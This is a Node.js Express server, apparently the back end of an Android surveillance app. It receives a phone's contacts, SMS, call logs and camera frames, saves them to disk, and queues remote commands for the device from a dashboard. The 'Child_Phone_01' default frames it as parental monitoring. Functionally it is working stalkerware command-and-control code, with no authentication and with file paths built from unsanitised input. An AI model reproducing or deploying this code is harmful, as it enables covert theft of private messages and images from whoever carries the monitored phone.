const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

// --- 1. SETTINGS ---
const UPLOADS_DIR = path.join(__dirname, 'uploads');

if (!fs.existsSync(UPLOADS_DIR)) {
    fs.mkdirSync(UPLOADS_DIR);
    console.log("📂 'uploads' folder created successfully.");
}

app.use(cors());
app.use(bodyParser.json({ limit: '50mb' })); 
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(express.static(__dirname));

let devices = {}; 

// ==================================================
// 📲 PHONE SIDE (Android App Yahan Baat Karega)
// ==================================================

// 1. STATUS UPDATE & COMMAND CHECK
// ✅ Corrected URL: '/api/status' (Android se match kiya)
app.post('/api/status', (req, res) => {
    
    // Android App se data receive karo
    const { device_id, model, battery, version, charging } = req.body; 

    const id = device_id || "Child_Phone_01";

    if (!devices[id]) devices[id] = {};
    
    const pendingCommand = devices[id].command || "none"; // Default 'none'

    // Update Status in RAM
    devices[id] = {
        model: model || "Unknown",
        battery: battery || 0,
        version: version || "--",
        charging: charging === 'true' || charging === true,
        lastSeen: Date.now(),
        command: "" // Command bhej di, ab clear kar do
    };

    console.log(`📡 Ping from ${id} | Bat: ${battery}% | Sent Cmd: ${pendingCommand}`);

    // 🔥 FIX: Plain text nahi, JSON bhejo! (Android code JSON parsing kar raha hai)
    res.json({ 
        status: "success",
        command: pendingCommand 
    });
});

// 2. DATA UPLOAD (Contacts, SMS, Logs)
// ✅ Corrected URL: '/api/upload_data' (Underscore use kiya)
app.post('/api/upload_data', (req, res) => {
    const { device_id, type, data } = req.body;
    const id = device_id || "Child_Phone_01";

    console.log(`📥 Data Received from ${id}: [${type}]`);

    let parsedData;
    try {
        parsedData = typeof data === 'string' ? JSON.parse(data) : data;
    } catch (e) {
        parsedData = data;
    }

    const fileName = `${id}_${type}.json`;
    const filePath = path.join(UPLOADS_DIR, fileName);

    try {
        fs.writeFileSync(filePath, JSON.stringify(parsedData, null, 2));
        console.log(`✅ Saved to: ${fileName}`);
        res.json({ status: "success" }); // Android ko JSON confirmation bhejo
    } catch (error) {
        console.error("❌ Save Error:", error);
        res.status(500).json({ status: "error" });
    }
});

// 3. CAMERA FRAME UPLOAD
// ✅ Corrected URL: '/api/upload_frame' (Underscore use kiya)
app.post('/api/upload_frame', (req, res) => {
    const { device_id, image_data } = req.body;
    const id = device_id || "Child_Phone_01";

    if (!image_data) {
        return res.status(400).send("No image data");
    }

    console.log(`📸 Image Received from ${id}`);

    const fileName = `${id}_cam_${Date.now()}.jpg`;
    const filePath = path.join(UPLOADS_DIR, fileName);

    // "data:image/jpeg;base64," hatao
    const base64Image = image_data.replace(/^data:image\/\w+;base64,/, "");

    fs.writeFile(filePath, base64Image, 'base64', (err) => {
        if (err) {
            console.error("❌ Image Save Error:", err);
            return res.status(500).send("error");
        }
        console.log(`✅ Photo Saved: ${fileName}`);
        res.json({ status: "success" });
    });
});


// ==================================================
// 💻 DASHBOARD SIDE (Website Logic)
// ==================================================

// Dashboard Status Check
app.get('/api/device-status/:id', (req, res) => {
    const id = req.params.id;
    const device = devices[id];

    if (!device) {
        return res.json({ isOnline: false, message: "Waiting..." });
    }

    const isOnline = (Date.now() - device.lastSeen) < 60000; // 60 sec timeout
    
    // Dashboard ko poora data bhejo
    res.json({ 
        ...device, 
        isOnline,
        lastSeenStr: new Date(device.lastSeen).toLocaleTimeString()
    });
});

// Dashboard Command Sender
app.post('/api/send-command', (req, res) => {
    const { device_id, command } = req.body;
    
    // Agar Dashboard se ID aayi to wahi use karo, warna default
    const id = device_id || "M2103K19I"; 

    if (!devices[id]) devices[id] = {};
    devices[id].command = command;
    
    console.log(`🚀 Command Queued: [${command}] for ${id}`);
    res.json({ status: "success", message: `Command '${command}' queued for ${id}` });
});

// Image Viewer
app.get('/uploads/:filename', (req, res) => {
    const filePath = path.join(UPLOADS_DIR, req.params.filename);
    if (fs.existsSync(filePath)) {
        res.sendFile(filePath);
    } else {
        res.status(404).send("File not found");
    }
});

// --- Server Start ---
app.listen(PORT, () => {
    console.log(`🔥 SERVER STARTED ON PORT ${PORT}`);
    console.log(`👉 Waiting for Android connection on /api/status...`);
});
